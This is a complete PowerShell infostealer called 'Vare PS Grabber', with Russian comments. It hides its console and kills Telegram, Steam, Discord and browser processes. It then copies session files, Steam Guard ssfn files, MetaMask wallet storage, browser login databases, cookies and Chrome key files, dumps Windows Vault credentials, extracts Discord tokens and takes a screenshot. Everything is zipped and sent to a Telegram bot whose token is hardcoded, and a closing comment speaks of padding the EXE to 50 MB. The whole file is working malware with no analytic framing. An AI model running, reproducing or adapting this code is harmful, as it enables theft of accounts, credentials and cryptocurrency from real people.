$ErrorActionPreference = 'silentlycontinue'
$pcname = $env:COMPUTERNAME
$RandomNumber = Get-Random

### TELEGRAM CONFIG
$chatid = "7834121003"
$bottoken = "7985438408:AAFcf42z6hQpDISVoPd7FqU8WQdIvmUAc6w"

### VARE SESSION THIEF CONFIG 
$telegramvr = "true"
$epicvr = "true"
$protonvr = "true"
$metavr = "true"
$steamvr = "true"
$discordvr = "true"
$screenshotvr = "true"

$DATE = Get-Date -Format "MM/dd/yyyy"
$DATE2 = Get-Date -Format "MM-dd-yyyy"

$IP = Invoke-WebRequest -Uri "http://ip-api.com/json/?fields=8194" -UseBasicParsing
$IP = $IP.Content | ConvertFrom-Json
$CR = $IP.countryCode
$IP = $IP.query

$main = "$env:LOCALAPPDATA\$CR`_$pcname($DATE2)$RandomNumber"
$sessions = "$env:LOCALAPPDATA\$CR`_$pcname($DATE2)$RandomNumber\Sessions"
$crypto = "$env:LOCALAPPDATA\$CR`_$pcname($DATE2)$RandomNumber\Sessions\Crypto"

$vareb64 = "KioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioKKiAgICAgICAgICAg4paI4paI4pWXICAg4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilojilojilojilojilZcg4paI4paI4paI4paI4paI4paI4paI4pWXICAgICAgICAgICoKKiAgICAgICAgICAg4paI4paI4pWRICAg4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWdICAgICAgICAgICoKKiAgICAgICAgICAg4paI4paI4pWRICAg4paI4paI4pWR4paI4paI4paI4paI4paI4paI4paI4pWR4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4paI4paI4paI4pWXICAgICAgICAgICAgKgoqICAgICAgICAgICDilZrilojilojilZcg4paI4paI4pWU4pWd4paI4paI4pWU4pWQ4pWQ4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4pWdICAgICAgICAgICAgKgoqICAgICAgICAgICAg4pWa4paI4paI4paI4paI4pWU4pWdIOKWiOKWiOKVkSAg4paI4paI4pWR4paI4paI4pWRICDilojilojilZHilojilojilojilojilojilojilojilZcgICAgICAgICAgKgoqICAgICAgICAgICAgIOKVmuKVkOKVkOKVkOKVnSAg4pWa4pWQ4pWdICDilZrilZDilZ3ilZrilZDilZ0gIOKVmuKVkOKVneKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVnSAgICAgICAgICAqCiogICAgICAgICAgICAgICAgICAgICAgPSBQUyBHUkFCQkVSICAgICAgICAgICAgICAgICAgICAgKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioq"
$dcstrings = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($vareb64))
$vare = "$dcstrings`nLog Name : $pcname`nLog Date : $DATE`n"

# Создаём папки скрыто (без вывода)
$null = New-Item -ItemType Directory -Path $main -Force -ErrorAction SilentlyContinue
$null = New-Item -ItemType Directory -Path $sessions -Force -ErrorAction SilentlyContinue
$null = New-Item -ItemType Directory -Path $crypto -Force -ErrorAction SilentlyContinue

$steam = "Not Found"
$telegram = "Not Found"
$epicgames = "Not Found"
$proton = "Not Found"
$metamask = "Not Found"
$discord = "Not Found"
$screenshot = "Not Found"

function hide-me
{
    if (-not ("Console.Window" -as [type])) { 
        Add-Type -Name Window -Namespace Console -MemberDefinition '
        [DllImport("Kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
        '
    }
    $consoler = [Console.Window]::GetConsoleWindow()
    $null = [Console.Window]::ShowWindow($consoler, 0)
}

function pcInfo() {
    $OS = (Get-WmiObject -class Win32_OperatingSystem).Caption
    $UUID = Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID
    $CPU = Get-WmiObject -Class Win32_Processor | Select-Object -ExpandProperty Name
    $GPU = (Get-WmiObject Win32_VideoController).Name 
    $RAM = Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | ForEach-Object {"{0:N2}" -f ([math]::round(($_.Sum / 1GB),2))}    
    $info = "$vare`n========================================================`n`nOS  : $OS`n`nUUID : $UUID`n`nCPU : $CPU`n`nGPU : $GPU`n`nRAM : $RAM`n`n========================================================"
    $info > $main\System.txt
}

function networkInfo() {
    $MAC = (Get-WmiObject win32_networkadapterconfiguration -ComputerName $env:COMPUTERNAME | Where-Object{$_.IpEnabled -Match "True"} | Select-Object -Expand macaddress) -join ","
    $info = "$vare`n========================================================`n`nIP  : $IP`n`nMAC : $MAC`n`n========================================================"
    $info > $main\Network.txt
}

# ============ УЛУЧШЕННАЯ КРАЖА TELEGRAM (копируем всё tdata) ============
function gettelegram {
    $path = "$env:userprofile\AppData\Roaming\Telegram Desktop\tdata"
    if (!(Test-Path $path)) { return }
    $processname = "telegram"
    try { if (Get-Process $processname -ErrorAction SilentlyContinue) { Get-Process -Name $processname | Stop-Process } } catch {}
    $destination = "$sessions\Telegram.zip"
    # Копируем все файлы и папки без исключений
    Compress-Archive -Path $path\* -DestinationPath $destination -CompressionLevel Fastest -Force -ErrorAction SilentlyContinue | Out-Null
}

# ============ УЛУЧШЕННАЯ КРАЖА STEAM (config, userdata, ssfn, *.vdf) ============
function getsteam {
    $steamfolder = "${Env:ProgramFiles(x86)}\Steam"
    if (!(Test-Path $steamfolder)) { return }
    $processname = "steam"
    try { if (Get-Process $processname -ErrorAction SilentlyContinue) { Get-Process -Name $processname | Stop-Process } } catch {}
    $steam_session = "$env:TEMP\Vare-Steam"
    $null = New-Item -ItemType Directory -Force -Path $steam_session -ErrorAction SilentlyContinue
    
    # Копируем всю папку config (включая loginusers.vdf)
    Copy-Item -Path "$steamfolder\config" -Destination $steam_session -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
    # Копируем папку userdata (локальные данные аккаунтов)
    if (Test-Path "$steamfolder\userdata") {
        Copy-Item -Path "$steamfolder\userdata" -Destination $steam_session -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
    }
    # Копируем все файлы ssfn*
    Get-ChildItem -Path $steamfolder -Filter "ssfn*" -File | ForEach-Object {
        Copy-Item -Path $_.FullName -Destination $steam_session -ErrorAction SilentlyContinue | Out-Null
    }
    # Копируем все .vdf из корня
    Get-ChildItem -Path $steamfolder -Filter "*.vdf" -File | ForEach-Object {
        Copy-Item -Path $_.FullName -Destination $steam_session -ErrorAction SilentlyContinue | Out-Null
    }
    
    Compress-Archive -Path $steam_session -DestinationPath "$sessions\Steam.zip" -CompressionLevel Fastest -Force -ErrorAction SilentlyContinue | Out-Null
    Remove-Item $steam_session -Recurse -Force -ErrorAction SilentlyContinue
}

function getepic {
    $epicgamesfolder = "$env:localappdata\EpicGamesLauncher"
    if (!(Test-Path $epicgamesfolder)) {return}
    $processname = "epicgameslauncher"
    try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
    $epicgames_session = "$env:temp\Vare-EpicGames"
    $null = New-Item -ItemType Directory -Force -Path $epicgames_session -ErrorAction SilentlyContinue
    Copy-Item -Path "$epicgamesfolder\Saved\Config" -Destination $epicgames_session -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
    Copy-Item -Path "$epicgamesfolder\Saved\Logs" -Destination $epicgames_session -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
    Copy-Item -Path "$epicgamesfolder\Saved\Data" -Destination $epicgames_session -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
    Compress-Archive -Path $epicgames_session -DestinationPath "$sessions\EpicGames.zip" -CompressionLevel Fastest -Force -ErrorAction SilentlyContinue | Out-Null
    Remove-Item $epicgames_session -Recurse -Force -ErrorAction SilentlyContinue
}

function getproton {
    $protonvpnfolder = "$env:localappdata\protonvpn"
    if (!(Test-Path $protonvpnfolder)) {return}
    $processname = "protonvpn"
    try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
    $protonvpn_account = "$env:temp\Vare-ProtonVPN"
    $null = New-Item -ItemType Directory -Force -Path $protonvpn_account -ErrorAction SilentlyContinue
    $pattern = "^(ProtonVPN_Url_[A-Za-z0-9]+)$"
    $directories = Get-ChildItem -Path $protonvpnfolder -Directory | Where-Object { $_.Name -match $pattern }
    $files = Get-ChildItem -Path $protonvpnfolder -File | Where-Object { $_.Name -match $pattern }
    foreach ($directory in $directories) {
        $destinationPath = Join-Path -Path $protonvpn_account -ChildPath $directory.Name
        Copy-Item -Path $directory.FullName -Destination $destinationPath -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
    }
    foreach ($file in $files) {
        $destinationPath = Join-Path -Path $protonvpn_account -ChildPath $file.Name
        Copy-Item -Path $file.FullName -Destination $destinationPath -Force -ErrorAction SilentlyContinue | Out-Null
    }
    Copy-Item -Path "$protonvpnfolder\Startup.profile" -Destination $protonvpn_account -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
    Compress-Archive -Path $protonvpn_account -DestinationPath "$sessions\ProtonVPN.zip" -CompressionLevel Fastest -Force -ErrorAction SilentlyContinue | Out-Null
    Remove-Item $protonvpn_account -Recurse -Force -ErrorAction SilentlyContinue
}

function getmetamask {
    $paths = @{
        "OperaGX" = "$env:APPDATA\Opera Software\Opera GX Stable\Local Extension Settings\"
        "Opera" = "$env:APPDATA\Opera Software\Opera Stable\Local Extension Settings\"
        "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local Extension Settings\"
        "Chrome1" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 1\Local Extension Settings\"
        "Chrome2" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 2\Local Extension Settings\"
        "Chrome3" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 3\Local Extension Settings\"
    }
    $extpath = @{
        "Meta" = "nkbihfbeogaeaoehlefnkodbefgpgknn"
    }
    foreach ($pathKey in $paths.Keys) {
        $pathValue = $paths[$pathKey]
        foreach ($extKey in $extpath.Keys) {
            $extValue = $extpath[$extKey]
            $sessiontemp = "$env:temp\$pathKey-MetaMask"
            $newPath = "$pathValue$extValue"
            if (Test-Path -Path $newPath -PathType Container) {
                $null = New-Item -ItemType Directory -Path $crypto -Force -ErrorAction SilentlyContinue
                Copy-Item -Path $newPath -Destination $sessiontemp -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
                Compress-Archive -Path $sessiontemp -DestinationPath "$crypto\$pathKey-MetaMask" -CompressionLevel Fastest -Force -ErrorAction SilentlyContinue | Out-Null
                Remove-Item $sessiontemp -Recurse -Force -ErrorAction SilentlyContinue
            }
        }
    }    
}

function getSteamGuardFiles {
    $steamfolder = "${Env:ProgramFiles(x86)}\Steam"
    if (!(Test-Path $steamfolder)) { return }
    $guardFolder = "$sessions\SteamGuard"
    $null = New-Item -ItemType Directory -Path $guardFolder -Force -ErrorAction SilentlyContinue
    Copy-Item "$steamfolder\config\*.vdf" -Destination $guardFolder -Force -ErrorAction SilentlyContinue | Out-Null
    Get-ChildItem -Path $steamfolder -Filter "ssfn*" -File | Copy-Item -Destination $guardFolder -Force -ErrorAction SilentlyContinue | Out-Null
}

function getSteamCredentials {
    $credsFolder = "$crypto\SteamCreds"
    $null = New-Item -ItemType Directory -Path $credsFolder -Force -ErrorAction SilentlyContinue
    $browserPatterns = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile*\Login Data",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data",
        "$env:LOCALAPPDATA\Opera Software\Opera Stable\Login Data"
    )
    foreach ($pattern in $browserPatterns) {
        $files = Get-ChildItem -Path $pattern -ErrorAction SilentlyContinue
        foreach ($f in $files) {
            Copy-Item -Path $f.FullName -Destination "$credsFolder\$(Get-Date -Format 'yyyyMMdd_HHmmss')_$($f.Name)" -Force -ErrorAction SilentlyContinue | Out-Null
        }
    }
    $firefoxProfiles = Get-ChildItem -Path "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory -ErrorAction SilentlyContinue
    foreach ($profile in $firefoxProfiles) {
        $keydb = Join-Path $profile.FullName "key4.db"
        $logins = Join-Path $profile.FullName "logins.json"
        if (Test-Path $keydb) { Copy-Item $keydb -Destination "$credsFolder\firefox_key4_$($profile.Name).db" -Force -ErrorAction SilentlyContinue | Out-Null }
        if (Test-Path $logins) { Copy-Item $logins -Destination "$credsFolder\firefox_logins_$($profile.Name).json" -Force -ErrorAction SilentlyContinue | Out-Null }
    }
    $vaultDump = "$credsFolder\WindowsVault.txt"
    vaultcmd /listcreds:"Windows Credentials" | Out-File $vaultDump -Encoding utf8 -ErrorAction SilentlyContinue
    vaultcmd /listcreds:"Web Credentials" | Out-File $vaultDump -Append -Encoding utf8 -ErrorAction SilentlyContinue
    $chromeKey = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    if (Test-Path $chromeKey) { Copy-Item $chromeKey -Destination "$credsFolder\ChromeLocalState.json" -Force -ErrorAction SilentlyContinue | Out-Null }
}

function getSteamCookies {
    $browserExes = @("chrome.exe", "msedge.exe", "opera.exe", "firefox.exe")
    foreach ($exe in $browserExes) {
        taskkill /F /IM $exe /T 2>$null
    }
    Start-Sleep -Seconds 2
    $cookieFolder = "$crypto\BrowserCookies"
    $null = New-Item -ItemType Directory -Path $cookieFolder -Force -ErrorAction SilentlyContinue
    $chromeUserData = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    if (Test-Path $chromeUserData) {
        $profiles = Get-ChildItem -Path $chromeUserData -Directory
        foreach ($profile in $profiles) {
            $cookieFile = Join-Path $profile.FullName "Cookies"
            if (Test-Path $cookieFile) { Copy-Item $cookieFile -Destination "$cookieFolder\Chrome_$($profile.Name).Cookies" -Force -ErrorAction SilentlyContinue | Out-Null }
            $networkCookie = Join-Path $profile.FullName "Network\Cookies"
            if (Test-Path $networkCookie) { Copy-Item $networkCookie -Destination "$cookieFolder\Chrome_$($profile.Name)_Network.Cookies" -Force -ErrorAction SilentlyContinue | Out-Null }
        }
    }
    $edgeUserData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
    if (Test-Path $edgeUserData) {
        $profiles = Get-ChildItem -Path $edgeUserData -Directory
        foreach ($profile in $profiles) {
            $cookieFile = Join-Path $profile.FullName "Cookies"
            if (Test-Path $cookieFile) { Copy-Item $cookieFile -Destination "$cookieFolder\Edge_$($profile.Name).Cookies" -Force -ErrorAction SilentlyContinue | Out-Null }
            $networkCookie = Join-Path $profile.FullName "Network\Cookies"
            if (Test-Path $networkCookie) { Copy-Item $networkCookie -Destination "$cookieFolder\Edge_$($profile.Name)_Network.Cookies" -Force -ErrorAction SilentlyContinue | Out-Null }
        }
    }
    $operaPaths = @(
        "$env:APPDATA\Opera Software\Opera Stable\Cookies",
        "$env:APPDATA\Opera Software\Opera GX Stable\Cookies"
    )
    foreach ($path in $operaPaths) {
        if (Test-Path $path) {
            $name = Split-Path -Path $path -Parent | Split-Path -Leaf
            Copy-Item $path -Destination "$cookieFolder\Opera_$name.Cookies" -Force -ErrorAction SilentlyContinue | Out-Null
        }
    }
    $firefoxProfiles = Get-ChildItem -Path "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory -ErrorAction SilentlyContinue
    foreach ($profile in $firefoxProfiles) {
        $cookieFiles = Get-ChildItem -Path $profile.FullName -Filter "cookies*" -File -ErrorAction SilentlyContinue
        foreach ($cf in $cookieFiles) {
            Copy-Item $cf.FullName -Destination "$cookieFolder\Firefox_$($profile.Name)_$($cf.Name)" -Force -ErrorAction SilentlyContinue | Out-Null
        }
    }
}

# ============ УЛУЧШЕННАЯ КРАЖА DISCORD (все папки приложений + LevelDB + браузерные Local Storage) ============
function getDiscord {
    $discordPaths = @(
        "$env:APPDATA\discord",
        "$env:APPDATA\discordptb",
        "$env:APPDATA\discordcanary"
    )
    $discordFolder = "$sessions\Discord"
    $null = New-Item -ItemType Directory -Path $discordFolder -Force -ErrorAction SilentlyContinue
    
    # Останавливаем все процессы Discord
    Get-Process -Name "discord*" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    
    # Копируем все папки Discord
    foreach ($p in $discordPaths) {
        if (Test-Path $p) {
            Copy-Item -Path $p -Destination $discordFolder -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
        }
    }
    # Копируем Local Storage из браузеров (для веб-версии)
    $browserLocalStorage = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\*discord*",
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile*\Local Storage\*discord*",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\*discord*",
        "$env:LOCALAPPDATA\Opera Software\Opera Stable\Local Storage\*discord*"
    )
    foreach ($pattern in $browserLocalStorage) {
        $files = Get-ChildItem -Path $pattern -ErrorAction SilentlyContinue
        foreach ($f in $files) {
            Copy-Item -Path $f.FullName -Destination "$discordFolder\Browser_$($f.Name)" -Force -ErrorAction SilentlyContinue | Out-Null
        }
    }
    
    # Сохраняем LevelDB с токенами
    $leveldbPaths = @(
        "$env:APPDATA\discord\Local Storage\leveldb",
        "$env:APPDATA\discordptb\Local Storage\leveldb",
        "$env:APPDATA\discordcanary\Local Storage\leveldb"
    )
    $tokenFolder = "$discordFolder\Tokens"
    $null = New-Item -ItemType Directory -Path $tokenFolder -Force -ErrorAction SilentlyContinue
    foreach ($ldb in $leveldbPaths) {
        if (Test-Path $ldb) {
            Copy-Item -Path $ldb -Destination $tokenFolder -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
        }
    }
}

# ============ ФУНКЦИЯ ДЛЯ ИЗВЛЕЧЕНИЯ И СОХРАНЕНИЯ ТОКЕНОВ (для ручного обновления) ============
function refreshDiscordToken {
    # Ищем все файлы, содержащие строки, похожие на токен Discord (длина ~70 символов)
    $tokenFiles = Get-ChildItem -Path "$sessions\Discord" -Recurse -Include "*.ldb","*.log","*.txt","*.json" -ErrorAction SilentlyContinue
    $tokens = @()
    foreach ($f in $tokenFiles) {
        $content = Get-Content $f.FullName -ErrorAction SilentlyContinue -Raw
        if ($content) {
            # Ищем паттерн токена Discord: обычно mfa.xxxx или просто строка букв/цифр/точек длиной ~70
            $matches = [regex]::Matches($content, '[a-zA-Z0-9\.\-_]{70,}')
            foreach ($m in $matches) {
                $tokens += $m.Value
            }
        }
    }
    # Сохраняем уникальные токены
    if ($tokens.Count -gt 0) {
        $tokens = $tokens | Select-Object -Unique
        $tokens | Out-File "$sessions\Discord\found_tokens.txt" -Encoding utf8
        $discord = "Found" # переопределим, чтобы в отчёте было Found
    }
}

function takeScreenshot {
    Add-Type -AssemblyName System.Drawing -ErrorAction SilentlyContinue
    Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue
    try {
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
        $bitmap.Save("$main\screenshot.png", [System.Drawing.Imaging.ImageFormat]::Png)
        $graphics.Dispose()
        $bitmap.Dispose()
        $screenshot = "Found"
    } catch { }
}

function startvare {
    hide-me
    pcInfo
    networkInfo
    if ($telegramvr -eq "true") { gettelegram }
    if ($steamvr -eq "true") {
        getsteam
        getSteamGuardFiles
        getSteamCredentials
        getSteamCookies
    }
    if ($epicvr -eq "true") { getepic }
    if ($protonvr -eq "true") { getproton }
    if ($metavr -eq "true") { getmetamask }
    if ($discordvr -eq "true") { 
        getDiscord
        refreshDiscordToken   # вызов после сбора Discord
    }
    if ($screenshotvr -eq "true") { takeScreenshot }
}

startvare

# Проверка наличия собранных данных (для отчёта)
if (!(Test-Path "$sessions\Telegram.zip")) {} else { $telegram = "Found" }
if (!(Test-Path "$sessions\Steam.zip")) {} else { $steam = "Found" }
if (!(Test-Path "$sessions\ProtonVPN.zip")) {} else { $proton = "Found" }
if (!(Test-Path "$sessions\EpicGames.zip")) {} else { $epicgames = "Found" }
if (!(Test-Path "$crypto")) {} else { $metamask = "Found" }
if (!(Test-Path "$sessions\Discord")) {} else { $discord = "Found" }
if (!(Test-Path "$main\screenshot.png")) {} else { $screenshot = "Found" }

$sessionscontent = "$vare`n========================================================`n`nTelegram  : $telegram`n`nSteam : $steam`n`nMetaMask : $metamask`n`nProtonVPN : $proton`n`nEpic Games : $epicgames`n`nDiscord : $discord`n`nScreenshot : $screenshot`n`n========================================================"
$sessionscontent > "$main\Sessions.txt"

Compress-Archive -Path $main -DestinationPath "$main.zip" -CompressionLevel Fastest -Force -ErrorAction SilentlyContinue | Out-Null
Remove-Item $main -Recurse -Force -ErrorAction SilentlyContinue

$mainpath = "$main.zip"
$api = "https://api.telegram.org/bot$bottoken/sendDocument"
$crl = "curl.exe -X POST -H ""content-type: multipart/form-data"" -F document=@'$mainpath' -F chat_id=$chatid $api"
Invoke-Expression $crl | Out-Null
Remove-Item "$main.zip" -Recurse -Force -ErrorAction SilentlyContinue
# Padding для увеличения размера EXE (50 МБ)
$padding = [byte[]]::new(25 * 1024 * 1024)
(New-Object Random).NextBytes($padding)